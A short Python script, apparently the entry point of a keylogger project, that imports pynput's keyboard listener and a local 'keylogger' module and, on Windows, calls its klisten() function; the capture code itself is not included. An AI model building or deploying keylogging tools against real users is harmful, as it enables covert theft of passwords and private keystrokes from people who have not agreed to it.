import platform, sys, os, socket
sys.path.append(r"c:\users\feuil\appdata\local\packages\pythonsoftwarefoundation.python.3.11_qbz5n2kfra8p0\localcache\local-packages\python311\site-packages")
from pynput.keyboard import Key, Listener
from datetime import datetime
# re, io, shutil, os
from keylogger import *

if "Linux" in platform.system():
    # Je suis sous Linux
    try:
        print("Linux")
    except Exception as e:
        print(f"Error: {e}")

elif "Windows" in platform.system():
    # Je suis sous Windows
    try:
        #
        #makeDirectory()
        klisten()
        #deleteDirectory()
    except Exception as e:
        print(f"Error: {e}")
